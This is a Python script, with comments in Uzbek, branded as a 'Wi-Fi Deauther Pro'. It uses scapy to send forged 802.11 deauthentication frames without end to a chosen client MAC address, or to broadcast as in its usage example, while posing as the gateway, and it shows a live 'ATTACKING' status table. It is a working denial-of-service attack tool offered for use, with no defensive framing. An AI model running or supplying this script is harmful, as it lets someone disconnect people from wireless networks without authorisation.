import sys
import time
from scapy.all import *
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel

console = Console()

def show_banner():
    banner = """
    [bold red]
     ██████  █████  ██ ██████  ██      ██    ██ ███    ███  ██████   ██████  ███    ██ 
    ██      ██   ██ ██ ██   ██ ██      ██    ██ ████  ████ ██    ██ ██    ██ ████   ██ 
     █████  ██   ██ ██ ██   ██ ██      ██    ██ ██ ████ ██ ██    ██ ██    ██ ██ ██  ██ 
         ██ ██   ██ ██ ██   ██ ██       ██  ██  ██  ██  ██ ██    ██ ██    ██ ██  ██ ██ 
    ██████   █████  ██ ██████  ███████   ████   ██      ██  ██████   ██████  ██   ████ 
    [/bold red]
    [bold white]KNIGHT Personal Assistant - Wi-Fi Deauther Pro[/bold white]
    """
    console.print(Panel(banner, border_style="bold blue"))

def deauth_attack(target, gateway, iface):
    # Paket yaratish
    dot11 = Dot11(addr1=target, addr2=gateway, addr3=gateway)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    
    table = Table(title="Hujum Monitoringi", border_style="cyan")
    table.add_column("Parametr", style="bold yellow")
    table.add_column("Qiymat", style="bold green")
    
    table.add_row("Interface", iface)
    table.add_row("Target MAC", target)
    table.add_row("Gateway MAC", gateway)
    table.add_row("Status", "Yuborilmoqda...")

    sent_count = 0
    with Live(table, refresh_per_second=4) as live:
        try:
            while True:
                sendp(packet, iface=iface, count=5, verbose=False)
                sent_count += 5
                
                # Jadvalni yangilash
                new_table = Table(title="Hujum Monitoringi", border_style="cyan")
                new_table.add_column("Parametr", style="bold yellow")
                new_table.add_column("Qiymat", style="bold green")
                new_table.add_row("Interface", iface)
                new_table.add_row("Target MAC", target)
                new_table.add_row("Gateway MAC", gateway)
                new_table.add_row("Sent Packets", str(sent_count))
                new_table.add_row("Status", "[bold red]ATTACKING[/bold red]")
                
                live.update(new_table)
                time.sleep(0.1)
        except KeyboardInterrupt:
            console.print("\n[bold red][!] Hujum foydalanuvchi tomonidan to'xtatildi.[/bold red]")

if __name__ == "__main__":
    os.system('clear')
    show_banner()
    
    if len(sys.argv) != 4:
        console.print("[bold yellow]Foydalanish:[/bold yellow] sudo python S010_Deauther.py <Target_MAC> <Gateway_MAC> <Interface>")
        console.print("[bold white]Misol:[/bold white] sudo python S010_Deauther.py FF:FF:FF:FF:FF:FF 00:AA:11:BB:22:CC wlan0mon")
        sys.exit()

    target_mac = sys.argv[1]
    gateway_mac = sys.argv[2]
    interface = sys.argv[3]

    deauth_attack(target_mac, gateway_mac, interface)
